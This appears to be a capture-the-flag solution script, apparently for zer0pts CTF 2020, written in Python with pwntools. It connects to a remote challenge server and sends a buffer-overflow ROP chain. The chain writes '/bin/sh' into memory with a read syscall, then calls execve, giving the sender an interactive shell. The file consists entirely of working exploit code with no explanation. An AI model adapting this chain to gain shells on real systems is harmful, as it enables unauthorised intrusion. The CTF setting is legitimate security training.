from pwn import *

r = remote("13.231.207.73", 9010) #process("./chall")
syscall = 0x004024dd # syscall ; ret
pop_rdi = 0x000000000040141c # pop rdi ; ret
pop_rax = 0x0000000000400121 # pop rax ; ret
pop_rsi = 0x000000000040141a # pop rsi ; pop r15 ; ret
pop_rdx = 0x00000000004023f5 # pop rdx ; ret
bss = 0x0000000000604240+24

### stage 1: write /bin/sh into the bss ###
p = "A"*264
p += p64(pop_rax)
p += p64(0x0)
p += p64(pop_rdi)
p += p64(0x0)
p += p64(pop_rsi)
p += p64(bss)
p += p64(0xdeadb33f)
p += p64(pop_rdx)
p += p64(0x8)
p += p64(syscall)
### stage 2: calling execve("/bin/sh",0,0)
p += p64(pop_rax)
p += p64(0x3b)
p += p64(pop_rdi)
p += p64(bss)
p += p64(pop_rsi)
p += p64(0x0)
p += p64(0xdeadb33f)
p += p64(pop_rdx)
p += p64(0x0)
p += p64(syscall)

r.sendline(p)
#r.recvuntil("Welcome to zer0pts CTF 2020!")
r.sendline("/bin/sh\x00")
r.interactive()
